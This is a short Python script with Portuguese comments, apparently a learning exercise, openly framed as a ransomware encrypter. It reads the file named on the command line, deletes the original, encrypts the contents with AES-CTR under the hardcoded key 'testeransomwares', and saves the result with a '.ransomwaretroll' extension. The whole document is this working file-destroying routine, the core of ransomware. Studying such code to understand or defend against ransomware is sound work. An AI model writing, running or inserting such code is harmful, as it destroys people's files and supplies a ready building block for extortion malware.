import os
import pyaes
import sys

if len(sys.argv) != 2:
    print("O nome do arquivo nao for dado. Use: python encrypter.py <filename>")
    sys.exit(1)  # Indicate an error

## abrir o arquivo a ser criptografado
file_name = sys.argv[1]
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo
os.remove(file_name)

## chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
